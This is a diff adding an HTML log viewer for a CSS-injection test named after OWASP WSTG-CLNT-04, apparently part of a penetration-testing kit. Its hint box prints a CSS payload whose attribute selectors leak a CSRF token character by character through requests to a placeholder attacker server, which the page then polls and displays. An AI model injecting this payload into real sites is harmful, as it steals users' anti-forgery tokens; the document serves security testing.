@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CLNT-04 CSS Injection Log Viewer — {{ENDPOINT_LABEL}}</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: monospace; background: #0d0d0d; color: #ccc; padding: 2rem; }
+    h1   { color: #c6f; margin-bottom: 0.25rem; }
+    .sub { color: #555; font-size: 0.85em; margin-bottom: 1.5rem; }
+    .meta { display: flex; gap: 2rem; margin-bottom: 1.5rem; }
+    .meta span { color: #888; font-size: 0.8em; }
+    .meta b { color: #c6f; }
+    #log-table { width: 100%; border-collapse: collapse; }
+    #log-table th { text-align: left; color: #c6f; padding: 0.4rem 1rem 0.4rem 0;
+                    border-bottom: 1px solid #2a2a2a; }
+    #log-table td { padding: 0.3rem 1rem 0.3rem 0; border-bottom: 1px solid #1a1a1a;
+                    vertical-align: top; }
+    .ts   { color: #555; white-space: nowrap; }
+    .ip   { color: #6cf; }
+    .path { color: #fc0; word-break: break-all; }
+    .ref  { color: #f90; word-break: break-all; }
+    .ua   { color: #888; font-size: 0.8em; word-break: break-all; }
+    .hit  { color: #0f0; font-weight: bold; }
+    #status { margin-bottom: 1rem; padding: 0.5rem 1rem;
+              background: #1a1a1a; border-left: 3px solid #c6f; color: #c6f; }
+    #status.ok  { border-color: #0f0; color: #0f0; }
+    #status.err { border-color: #f00; color: #f00; }
+    .empty { color: #444; padding: 1rem 0; }
+    .payload-hint { background: #161616; border-left: 3px solid #333;
+                    padding: 0.75rem 1rem; margin-bottom: 1.5rem;
+                    font-size: 0.82em; color: #666; }
+    .payload-hint b { color: #c6f; }
+    .payload-hint code { color: #fc0; }
+  </style>
+</head>
+<body>
+  <h1>WSTG-CLNT-04 — CSS Injection Log Viewer</h1>
+  <p class="sub">Polls your SimpleHTTP server log for CSS exfil ping-backs</p>
+
+  <div class="meta">
+    <span>Attacker: <b>{{ATTACKER_BASE_URL}}</b></span>
+    <span>Target: <b>{{TARGET_URL}}</b></span>
+    <span>Endpoint: <b>{{ENDPOINT_PATH}}</b></span>
+    <span>Params: <b>{{PARAMS}}</b></span>
+  </div>
+
+  <div class="payload-hint">
+    <b>CSS exfil payload to inject into <code>{{PARAMS}}</code> on <code>{{TARGET_URL}}</code>:</b><br><br>
+    <code>
+      input[name=csrf][value^=a]{'{'}background:url({{ATTACKER_BASE_URL}}/css?v=a){'}'}<br>
+      input[name=csrf][value^=b]{'{'}background:url({{ATTACKER_BASE_URL}}/css?v=b){'}'}<br>
+      ...
+    </code><br>
+    Each character that matches triggers a request to your server.
+    This page polls <code>/clnt04-log</code> every 2 seconds and displays hits below.
+  </div>
+
+  <div id="status">Polling {{ATTACKER_BASE_URL}}/clnt04-log …</div>
+
+  <table id="log-table">
+    <thead>
+      <tr>
+        <th>Time</th>
+        <th>Client IP</th>
+        <th>Request path</th>
+        <th>Referer</th>
+        <th>User-Agent</th>
+      </tr>
+    </thead>
+    <tbody id="log-body">
+      <tr><td colspan="5" class="empty">No hits yet — waiting…</td></tr>
+    </tbody>
+  </table>
+
+  <script>
+    // ── Config ────────────────────────────────────────────────────────────
+    const LOG_ENDPOINT  = "{{ATTACKER_BASE_URL}}/clnt04-log";
+    const POLL_INTERVAL = 2000;   // ms
+    const CSS_MARKER    = "/css"; // treat requests containing this as exfil hits
+
+    let seen  = new Set();
+    let total = 0;
+
+    // ── Fetch + render ────────────────────────────────────────────────────
+    async function poll() {
+      const status = document.getElementById("status");
+      try {
+        const r   = await fetch(LOG_ENDPOINT + "?t=" + Date.now());
+        const txt = await r.text();
+
+        status.textContent = "Polling " + LOG_ENDPOINT + " — last response: " + r.status;
+        status.className   = r.ok ? "ok" : "err";
+
+        // Each line: "timestamp ip METHOD /path HTTP/1.1" and optional Referer/UA
+        const lines = txt.split("\n").filter(l => l.trim());
+        const tbody = document.getElementById("log-body");
+
+        let added = 0;
+        for (const line of lines) {
+          if (seen.has(line)) continue;
+          seen.add(line);
+
+          // Try to parse SimpleHTTP log format:
+          // 127.0.0.1 - - [18/Oct/2026 12:34:56] "GET /css?v=a HTTP/1.1" 200 -
+          const m = line.match(
+            /^(\S+)\s+-\s+-\s+\[([^\]]+)\]\s+"(\S+)\s+(\S+)\s+\S+"\s+(\d+)/
+          );
+          let ts    = "";
+          let ip    = "";
+          let path  = line;
+          let ref   = "";
+          let ua    = "";
+          let isHit = false;
+
+          if (m) {
+            ip   = m[1];
+            ts   = m[2];
+            path = m[3] + " " + m[4] + " → " + m[5];
+            isHit = m[4].includes(CSS_MARKER);
+          }
+
+          // Remove placeholder row if present
+          if (total === 0) tbody.innerHTML = "";
+
+          const tr = document.createElement("tr");
+          tr.innerHTML =
+            "<td class='ts'>"  + escHtml(ts)   + "</td>" +
+            "<td class='ip'>"  + escHtml(ip)   + "</td>" +
+            "<td class='" + (isHit ? "path hit" : "path") + "'>" + escHtml(path) + "</td>" +
+            "<td class='ref'>" + escHtml(ref)  + "</td>" +
+            "<td class='ua'>"  + escHtml(ua)   + "</td>";
+          tbody.prepend(tr);  // newest first
+          total++;
+          added++;
+        }
+
+        if (added) {
+          status.textContent += " (" + total + " total log entries)";
+        }
+
+      } catch (e) {
+        status.textContent = "Error polling " + LOG_ENDPOINT + ": " + e.message +
+          " — is clnt_serve.py running?";
+        status.className = "err";
+      }
+    }
+
+    function escHtml(s) {
+      return String(s)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;");
+    }
+
+    poll();
+    setInterval(poll, POLL_INTERVAL);
+  </script>
+</body>
+</html>
